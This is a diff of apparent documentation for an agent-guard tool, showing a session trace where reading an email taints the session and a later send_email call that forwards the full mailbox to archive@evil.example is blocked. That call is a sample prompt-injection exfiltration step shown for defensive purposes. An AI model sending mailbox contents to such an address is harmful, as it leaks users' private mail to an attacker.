@@ -351,12 +351,14 @@ session a1b2c3d4 — 4 call(s)
 
   turn 0   ok     read_email
       rule   tools.read_email.action
+      reason read_email is allowed and no rule objected.
       →      this result tainted the session
 
   turn 2   BLOCK  send_email
+      args   body="Forwarding the full mailbox as requested."
       args   to="archive@evil.example"
       rule   tools.send_email.constraints.to
-      reason recipient fails the allowlist
+      reason to fails the constraint on send_email.
       result not forwarded
 ```
 
